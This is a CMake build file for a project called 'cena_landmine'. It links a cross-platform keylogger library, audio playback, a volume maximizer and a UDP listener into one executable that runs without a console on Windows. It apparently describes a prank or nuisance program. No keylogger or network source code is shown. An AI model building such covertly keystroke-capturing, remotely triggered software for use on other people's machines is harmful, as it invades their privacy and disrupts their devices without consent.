cmake_minimum_required(VERSION 3.22)
project(cena_landmine C CXX)

set(CMAKE_CXX_STANDARD 20)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# keylogger — platform-specific static library, no external dependencies
add_library(keylogger STATIC src/keylogger.cpp)
target_include_directories(keylogger PUBLIC src)

if(APPLE)
    target_link_libraries(keylogger PUBLIC "-framework ApplicationServices")
elseif(UNIX)
    find_package(Threads REQUIRED)
    target_link_libraries(keylogger PUBLIC Threads::Threads)
elseif(WIN32)
    target_link_libraries(keylogger PUBLIC user32)
endif()

# -----------------------------------------------------------------------
# miniaudio — header-only, expose as interface target
# -----------------------------------------------------------------------
add_library(miniaudio INTERFACE)
target_include_directories(miniaudio INTERFACE external/miniaudio)

# -----------------------------------------------------------------------
# audio — wraps miniaudio + bundled WAV asset
# -----------------------------------------------------------------------
add_library(audio STATIC src/audio.cpp)
target_include_directories(audio PUBLIC src)
target_link_libraries(audio PUBLIC miniaudio)

if(APPLE)
    target_link_libraries(audio PUBLIC
        "-framework CoreAudio"
        "-framework AudioToolbox"
        "-framework CoreFoundation"
    )
elseif(UNIX)
    find_package(Threads REQUIRED)
    target_link_libraries(audio PUBLIC Threads::Threads ${CMAKE_DL_LIBS} m)
elseif(WIN32)
    target_link_libraries(audio PUBLIC ole32 winmm)
endif()

# -----------------------------------------------------------------------
# volume_maximizer — platform-specific static library
# -----------------------------------------------------------------------
add_library(volume_maximizer STATIC src/volume_maximizer.cpp)
target_include_directories(volume_maximizer PUBLIC src)

if(WIN32)
    target_link_libraries(volume_maximizer PUBLIC ole32)
endif()

# -----------------------------------------------------------------------
# cena_main — entry point
# -----------------------------------------------------------------------
add_executable(sw_cen src/main.cpp)
target_link_libraries(sw_cen PRIVATE keylogger audio volume_maximizer)

# -----------------------------------------------------------------------
# udp_listener — hand-rolled cross-platform UDP, no external deps
# -----------------------------------------------------------------------
add_library(udp_listener STATIC src/udp_listener.cpp)
target_include_directories(udp_listener PUBLIC src)

if(WIN32)
    target_link_libraries(udp_listener PUBLIC ws2_32)
elseif(UNIX)
    find_package(Threads REQUIRED)
    target_link_libraries(udp_listener PUBLIC Threads::Threads)
endif()

target_link_libraries(sw_cen PRIVATE udp_listener)

if(WIN32)
    set_target_properties(sw_cen PROPERTIES WIN32_EXECUTABLE TRUE)
    if(MSVC)
        target_link_options(sw_cen PRIVATE /ENTRY:mainCRTStartup)
    endif()
endif()
